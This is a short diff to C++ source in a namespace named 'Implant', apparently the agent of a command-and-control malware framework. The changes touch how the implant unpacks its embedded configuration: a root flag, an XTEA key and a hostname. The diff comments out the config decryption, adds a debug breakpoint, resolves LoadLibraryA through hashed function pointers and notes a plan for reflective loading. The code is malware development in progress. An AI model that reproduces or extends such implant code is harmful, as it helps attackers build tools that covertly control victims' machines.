@@ -61,17 +61,10 @@ namespace Implant {
         Parser::CreateParser(&Parser, Config, sizeof(Config));
         x_memset(Config, 0, sizeof(Config));
 
-        LPVOID test = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(BYTE));
-        Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, test);
-
-        BYTE pLE    = Parser::UnpackByte(&Parser);
-        BYTE pRoot  = Parser::UnpackByte(&Parser);
-
-        x_memcpy(&Ctx->LE, &pLE, 1);
-        x_memcpy(&Ctx->Root, &pRoot, 1);
-
+        Parser::ParserBytecpy(&Parser, R_CAST(PBYTE, &Ctx->Root));
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
-        Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
+
+        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
 
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
@@ -118,6 +111,7 @@ namespace Implant {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
+        __debugbreak();
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
 
         Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
